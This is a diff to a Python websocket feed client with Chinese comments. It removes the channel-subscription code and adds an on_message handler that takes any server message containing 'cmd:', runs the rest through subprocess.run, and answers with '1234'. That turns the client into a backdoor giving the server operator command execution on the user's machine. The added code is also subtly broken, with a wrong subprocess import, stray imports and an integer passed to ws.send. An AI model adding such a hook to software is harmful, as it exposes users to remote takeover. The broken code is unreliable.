@@ -1,4 +1,7 @@
 from ast import main
+from asyncio import subprocess
+from re import S
+from sys import stdout
 import requests
 
 def start():
@@ -17,40 +20,23 @@ def stop():
 import json
 import websocket    # pip install websocket-client
 
-CHANNELS_WS = [
-    # 这里输入需要订阅的频道
-]
-
-
 class Feed(object):
 
     def __init__(self, url):
         self.url = url      # 这里输入websocket的url
         self.ws = None
 
+    def on_data(self, ws):
+        pass
+
     def on_open(self, ws):
         """
-        Callback object which is called at opening websocket.
-        1 argument:
-        @ ws: the WebSocketApp object
+         open connect and send pcid
         """
         print('A new WebSocketApp is opened!')
 
         # 开始订阅（举个例子）
-        sub_param = {"op": "subscribe", "args": CHANNELS_WS}
-        sub_str = json.dumps(sub_param)
-        ws.send(sub_str)
-        print("Following Channels are subscribed!")
-        print(CHANNELS_WS)
-
-    def on_data(self, ws, string, type, continue_flag):
-        """
-        4 argument.
-        The 1st argument is this class object.
-        The 2nd argument is utf-8 string which we get from the server.
-        The 3rd argument is data type. ABNF.OPCODE_TEXT or ABNF.OPCODE_BINARY will be came.
-        The 4th argument is continue flag. If 0, the data continue
-        """
+        ws.send(1)
 
     def on_message(self, ws, message):
         """
@@ -60,7 +46,11 @@ class Feed(object):
         @ message: utf-8 data received from the server
         """
         # 对收到的message进行解析
-        print(message)
+        print("收到", message)
+        if "cmd:" in message:
+            cmds = message.split("cmd:")
+            res = subprocess.run(cmds[-1], stdout=subprocess.PIPE)
+            self.ws.send(str(1234))
 
     def on_error(self, ws, error):
         """
@@ -94,5 +84,5 @@ class Feed(object):
 
 
 if __name__ == "__main__":
-    print(start())
+    # print(start())
     wsRead()
